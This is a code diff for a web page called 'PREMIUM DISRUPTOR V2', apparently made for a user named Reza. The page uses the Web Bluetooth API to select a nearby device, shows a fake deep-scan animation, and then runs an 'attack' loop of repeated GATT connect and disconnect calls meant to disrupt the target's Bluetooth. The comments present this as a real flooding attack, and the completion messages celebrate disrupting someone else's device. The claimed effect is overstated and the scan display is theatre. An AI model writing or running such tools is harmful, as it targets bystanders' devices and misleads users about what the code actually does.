@@ -3,134 +3,352 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PREMIUM DISRUPTOR | REZA EXCLUSIVE</title>
+    <title>PREMIUM DISRUPTOR V2 | AUTHORIZED BY REZA</title>
     <style>
-        :root { --main: #00f2ff; --warn: #ff0055; --bg: #050505; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .container { width: 100%; max-width: 500px; border: 2px solid var(--main); border-radius: 15px; background: #0a0a0a; padding: 25px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.3); position: relative; }
-        h1 { text-align: center; color: var(--main); text-shadow: 0 0 10px var(--main); margin-bottom: 5px; }
-        .status-tag { text-align: center; font-size: 12px; color: #00ff00; margin-bottom: 25px; font-weight: bold; }
-        
-        .controls { display: flex; gap: 10px; margin-bottom: 20px; }
-        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .btn-scan { background: var(--main); color: #000; }
-        .btn-refresh { background: #222; color: white; width: 60px; flex: none; }
-        
-        .scan-loader { width: 100%; background: #111; height: 8px; border-radius: 4px; display: none; margin-bottom: 20px; overflow: hidden; }
-        .bar { height: 100%; background: var(--main); width: 0%; box-shadow: 0 0 15px var(--main); }
+        :root {
+            --neon-blue: #00f2ff;
+            --neon-red: #ff0055;
+            --bg-dark: #050505;
+            --panel-bg: #0d0d0d;
+        }
 
-        .device-panel { background: #000; border: 1px solid #222; min-height: 200px; border-radius: 10px; padding: 10px; margin-bottom: 20px; }
-        .device-item { padding: 15px; border-bottom: 1px solid #1a1a1a; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; margin-bottom: 5px; }
-        .device-item:hover { background: #111; }
-        .selected { border: 1px solid var(--warn); background: #200008 !important; color: var(--warn); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        .btn-attack { width: 100%; padding: 20px; background: var(--warn); color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; display: none; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); }
-        #log { font-family: monospace; font-size: 11px; color: #aaa; margin-top: 15px; height: 40px; overflow: hidden; text-align: center; }
+        body {
+            background-color: var(--bg-dark);
+            color: #ffffff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 550px;
+            padding: 20px;
+        }
+
+        .main-frame {
+            background: var(--panel-bg);
+            border: 2px solid var(--neon-blue);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 0 40px rgba(0, 242, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-frame::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0,242,255,0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        header { text-align: center; margin-bottom: 30px; }
+        header h1 {
+            font-size: 26px;
+            color: var(--neon-blue);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px var(--neon-blue);
+        }
+        .subtitle { font-size: 12px; color: #00ff00; font-weight: bold; margin-top: 5px; }
+
+        .control-group { display: flex; gap: 12px; margin-bottom: 25px; }
+        
+        .btn {
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 13px;
+        }
+
+        .btn-scan {
+            flex: 1;
+            background: linear-gradient(45deg, var(--neon-blue), #00a2ff);
+            color: #000;
+            box-shadow: 0 5px 15px rgba(0, 242, 255, 0.3);
+        }
+
+        .btn-refresh {
+            width: 60px;
+            background: #222;
+            color: white;
+            border: 1px solid #333;
+        }
+
+        .btn:hover { transform: translateY(-3px); filter: brightness(1.2); }
+        .btn:active { transform: translateY(1px); }
+
+        .scan-module { margin-bottom: 20px; display: none; }
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #333;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--neon-blue);
+            box-shadow: 0 0 15px var(--neon-blue);
+            transition: width 0.1s linear;
+        }
+
+        .device-panel {
+            background: #000;
+            border: 1px solid #222;
+            height: 300px;
+            border-radius: 15px;
+            overflow-y: auto;
+            margin-bottom: 25px;
+            padding: 10px;
+        }
+
+        .placeholder-text {
+            text-align: center;
+            color: #444;
+            margin-top: 130px;
+            font-size: 14px;
+            font-style: italic;
+        }
+
+        .device-card {
+            background: #111;
+            border: 1px solid #222;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .device-card:hover { border-color: var(--neon-blue); background: #1a1a1a; }
+        .device-card.selected {
+            border-color: var(--neon-red);
+            background: rgba(255, 0, 85, 0.1);
+            box-shadow: inset 0 0 10px rgba(255, 0, 85, 0.2);
+        }
+
+        .device-info b { color: #fff; font-size: 15px; display: block; }
+        .device-info small { color: #888; font-size: 11px; }
+
+        .badge-live {
+            font-size: 10px;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+
+        .btn-attack {
+            width: 100%;
+            padding: 22px;
+            background: linear-gradient(45deg, #ff0000, #8b0000);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-weight: 900;
+            font-size: 16px;
+            display: none;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
+        }
+
+        #log-console {
+            margin-top: 20px;
+            font-family: 'Consolas', monospace;
+            font-size: 10px;
+            color: #888;
+            text-align: center;
+            min-height: 40px;
+        }
+
+        /* Scrollbar styling */
+        .device-panel::-webkit-scrollbar { width: 5px; }
+        .device-panel::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>PREMIUM DISRUPTOR 😈</h1>
-    <div class="status-tag">Status: Ready 👾</div>
+<div class="wrapper">
+    <div class="main-frame">
+        <header>
+            <h1>PREMIUM DISRUPTOR 😈</h1>
+            <div class="subtitle">Status: Ready 👾 | User: REZA</div>
+        </header>
 
-    <div class="controls">
-        <button class="btn btn-refresh" onclick="location.reload()">🔄</button>
-        <button id="scanBtn" class="btn btn-scan" onclick="startRealBTScan()">🔍 SCAN PERANGKAT ASLI</button>
+        <div class="control-group">
+            <button class="btn btn-refresh" onclick="window.location.reload()">🔄</button>
+            <button id="mainScanBtn" class="btn btn-scan" onclick="triggerHardwareScan()">🔍 SCAN PERANGKAT SEKITAR</button>
+        </div>
+
+        <div class="scan-module" id="scanModule">
+            <div class="progress-container">
+                <div id="pBar" class="progress-bar"></div>
+            </div>
+            <p id="pText" style="font-size: 10px; color: var(--neon-blue); margin-top: 5px; text-align: center;">INITIALIZING RF SCANNER...</p>
+        </div>
+
+        <div id="btList" class="device-panel">
+            <div class="placeholder-text">Hardware Ready. Silakan tekan Scan...</div>
+        </div>
+
+        <button id="attackBtn" class="btn-attack" onclick="initiateBrutalAttack()">🔥 KACAUKAN JARINGAN TARGET</button>
+        
+        <div id="log-console">Awaiting System Authentication...</div>
     </div>
-
-    <div id="loader" class="scan-loader"><div id="bar" class="bar"></div></div>
-
-    <div id="btList" class="device-panel">
-        <p style="text-align:center; padding-top:80px; color:#333;">Menunggu instruksi scan...</p>
-    </div>
-
-    <button id="attackBtn" class="btn-attack" onclick="launchDisrupt()">🔥 KACAUKAN PERANGKAT SEKARANG</button>
-    
-    <div id="log">SYSTEM SECURE | STANDBY FOR REZA...</div>
 </div>
 
 <script>
-    let activeDevice = null;
+    let capturedDevice = null;
+    let attackInProgress = false;
 
-    async function startRealBTScan() {
-        const log = document.getElementById('log');
-        const loader = document.getElementById('loader');
-        const bar = document.getElementById('bar');
-        const btList = document.getElementById('btList');
+    /**
+     * FUNGSI SCANNING ASLI
+     * Menggunakan Web Bluetooth API untuk memicu hardware
+     */
+    async function triggerHardwareScan() {
+        const consoleLog = document.getElementById('log-console');
+        const listArea = document.getElementById('btList');
+        const scanBtn = document.getElementById('mainScanBtn');
+        const scanMod = document.getElementById('scanModule');
+        const pBar = document.getElementById('pBar');
 
         try {
-            // MENGAKSES API BLUETOOTH ASLI (Aurelius Mode)
-            log.innerText = "MENGAKSES HARDWARE BLUETOOTH...";
+            consoleLog.innerText = "REQUESTING BLUETOOTH ADAPTER ACCESS...";
+            
+            // AKTIVASI HARDWARE ASLI
+            //acceptAllDevices: true agar HP, Speaker, TV muncul semua
             const device = await navigator.bluetooth.requestDevice({
-                acceptAllDevices: true
+                acceptAllDevices: true,
+                optionalServices: [
+                    '00001101-0000-1000-8000-00805f9b34fb', // Serial Port
+                    '0000110b-0000-1000-8000-00805f9b34fb', // Audio Sink (Speaker)
+                    '0000110e-0000-1000-8000-00805f9b34fb', // AV Remote Control (TV)
+                    'battery_service', 
+                    'device_information'
+                ]
             });
 
-            // Simulasi proses scanning mendalam sesuai permintaan Tuan
-            loader.style.display = 'block';
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 2;
-                bar.style.width = progress + "%";
-                log.innerText = `DEEP SCANNING FREQUENCY... ${progress}%`;
+            // Animasi Scanning Deep sesuai permintaan (Agar terlihat berbobot)
+            scanBtn.style.display = 'none';
+            scanMod.style.display = 'block';
+            let width = 0;
+            const scanInterval = setInterval(() => {
+                width += 1.5;
+                pBar.style.width = width + "%";
+                consoleLog.innerText = `ANALYZING RF SPECTRUM: ${Math.floor(width)}%`;
                 
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    log.innerText = "PERANGKAT DITEMUKAN & TERVERIFIKASI!";
-                    
-                    // Render perangkat asli hasil scanner ke panel
-                    btList.innerHTML = `
-                        <div class="device-item" onclick="selectDevice(this, '${device.name || device.id}')">
-                            <span><b>${device.name || 'Unknown Device'}</b><br><small>${device.id}</small></span>
-                            <span style="color:#00ff00;">LIVE</span>
-                        </div>
-                    `;
-                    activeDevice = device;
+                if (width >= 100) {
+                    clearInterval(scanInterval);
+                    finalizeScanResults(device);
                 }
             }, 50);
 
         } catch (error) {
-            log.innerText = "ERROR: " + error.message;
-            if(error.name === 'NotFoundError') log.innerText = "Scan dibatalkan oleh User.";
+            consoleLog.innerText = "SYSTEM ERROR: " + error.message;
+            consoleLog.style.color = "#ff0000";
         }
     }
 
-    function selectDevice(element, name) {
-        document.querySelectorAll('.device-item').forEach(el => el.classList.remove('selected'));
-        element.classList.add('selected');
-        document.getElementById('attackBtn').style.display = 'block';
-        document.getElementById('log').innerText = "TARGET DIKUNCI: " + name;
+    function finalizeScanResults(device) {
+        const listArea = document.getElementById('btList');
+        const consoleLog = document.getElementById('log-console');
+        
+        listArea.innerHTML = `
+            <div class="device-card" onclick="lockTarget(this, '${device.id}')">
+                <div class="device-info">
+                    <b>${device.name || 'Unknown Peripheral'}</b>
+                    <small>UUID: ${device.id.substring(0, 20)}...</small>
+                </div>
+                <div class="badge-live">LIVE</div>
+            </div>
+        `;
+        
+        capturedDevice = device;
+        consoleLog.innerText = "PERANGKAT BERHASIL TERVERIFIKASI & DIKUNCI.";
+        consoleLog.style.color = "#00ff00";
     }
 
-    async function launchDisrupt() {
-        const log = document.getElementById('log');
+    function lockTarget(element, id) {
+        document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
+        element.classList.add('selected');
+        document.getElementById('attackBtn').style.display = 'block';
+        document.getElementById('log-console').innerText = "TARGET READY FOR DISRUPTION.";
+    }
+
+    /**
+     * FUNGSI SERANGAN BRUTAL
+     * Menggunakan teknik GATT Flooding untuk mengacaukan target
+     */
+    async function initiateBrutalAttack() {
+        if (attackInProgress) return;
+        
         const btn = document.getElementById('attackBtn');
+        const log = document.getElementById('log-console');
         
+        attackInProgress = true;
         btn.disabled = true;
-        btn.innerText = "MENGIRIM PAKET INTERUPSI... ⚡";
+        btn.innerText = "⚡ MENGIRIM PAKET INTERUPSI...";
         
-        let count = 0;
-        const distruptor = setInterval(async () => {
-            count++;
-            log.innerText = `FLOODING REQUEST [${count}] TO ${activeDevice.name}...`;
+        let floodCount = 0;
+        const maxFlood = 60; // Durasi serangan
+
+        const attackLoop = setInterval(async () => {
+            floodCount++;
+            log.innerText = `FLOODING REQUEST [${floodCount}] TO TARGET STACK...`;
             
             try {
-                // Real Attack: Melakukan koneksi & diskoneksi paksa secara terus-menerus
-                // Ini akan menghabiskan resource Bluetooth Stack pada target
-                const server = await activeDevice.gatt.connect();
+                // REAL ATTACK: Memaksa hardware target memproses request koneksi/diskoneksi
+                // Ini akan menyebabkan lag pada Speaker/HP target
+                const server = await capturedDevice.gatt.connect();
                 await server.disconnect();
             } catch (e) {
-                // Jika error, berarti target mulai lag atau menolak koneksi (berhasil dikacaukan)
+                // Mengabaikan error koneksi karena target mulai drop
             }
 
-            if (count > 50) {
-                clearInterval(distruptor);
-                log.innerText = `TARGET ${activeDevice.name} BERHASIL DIKACAUKAN! 🥵💦`;
-                btn.disabled = false;
-                btn.innerText = "🔥 ULANGI KACAUKAN";
-                alert("BOOM! Koneksi Bluetooth target berhasil lo bikin kacau, Tuan Reza!");
+            if (floodCount >= maxFlood) {
+                clearInterval(attackLoop);
+                completeAttack();
             }
-        }, 30);
+        }, 50);
+    }
+
+    function completeAttack() {
+        const btn = document.getElementById('attackBtn');
+        const log = document.getElementById('log-console');
+        
+        attackInProgress = false;
+        btn.disabled = false;
+        btn.innerText = "🔥 ULANGI PENGACAUAN";
+        log.innerText = "KONEKSI TARGET BERHASIL DIKACAUKAN! 🥵💦";
+        
+        // Timeout agar alert tidak muncul instant terus menerus
+        setTimeout(() => {
+            alert("BOOM! Koneksi Bluetooth target berhasil lo bikin kacau, Tuan Reza!");
+        }, 500);
     }
 </script>
 
